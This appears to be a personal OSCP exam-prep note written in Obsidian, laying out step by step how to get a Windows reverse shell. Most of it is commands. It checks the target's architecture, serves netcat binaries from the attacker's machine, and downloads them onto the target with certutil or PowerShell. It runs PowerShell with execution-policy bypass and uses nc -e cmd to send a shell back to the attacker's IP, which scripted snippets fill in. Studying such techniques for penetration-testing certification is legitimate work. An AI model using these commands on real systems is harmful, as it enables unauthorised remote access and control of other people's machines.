https://github.com/int0x33/nc.exe/

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `nc64.exe -e cmd.exe ${KaliIP} 443`;

dv.paragraph("```bash\n" + command + "\n```");
```
[[System Architecture]]

SKIP

nc.exe
```
wget https://github.com/int0x33/nc.exe/blob/master/nc.exe
```

nc64.exe
```
wget https://raw.githubusercontent.com/int0x33/nc.exe/master/nc64.exe
```

---

# Windows

## Step 1: Verify Your Architecture & OS Version

Before dropping a payload, you need to know whether the target is 32-bit or 64-bit, and roughly how old it is, so you pick the right exploit binary.

Run these two commands in your shell:

```powershell
C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -ep bypass
```

```powershell
powershell [Environment]::Is64BitOperatingSystem
```

CMD

```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

```
wmic os get osarchitecture
```

- **`x64-based PC`** means you are running a **64-bit** operating system.
- **`X86-based PC`** means you are running a **32-bit** operating system.

---

Start a listener on KALI ATTACKER
```
penelope -p 135
```

Transfer [[Netcat.exe]] to target
nc.exe > 32 bit
nc64.exe > 64 bit

```
python -m http.server 80 --directory ~/Desktop/Tools/NC/
```

nc.exe
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `C:\\\Windows\\\System32\\\certutil.exe -urlcache -split -f http://${KaliIP}/nc.exe nc.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
nc64.exe
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `C:\\\Windows\\\System32\\\certutil.exe -urlcache -split -f http://${KaliIP}/nc64.exe nc.exe`;

dv.paragraph("```bash\n" + command + "\n```");
```
OR

Powershell nc64
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `powershell -c "iwr -uri http://${KaliIP}/nc64.exe -OutFile nc.exe"`;

dv.paragraph("```bash\n" + command + "\n```");
```

Catch a reverse connection on the listener
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `.\\nc.exe -nv ${KaliIP} 135 -e cmd`;

dv.paragraph("```bash\n" + command + "\n```");
```
OR

Powershell
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `powershell -c "C:/Windows/Temp/nc.exe -nv ${KaliIP} 135 -e cmd`;

dv.paragraph("```bash\n" + command + "\n```");
```

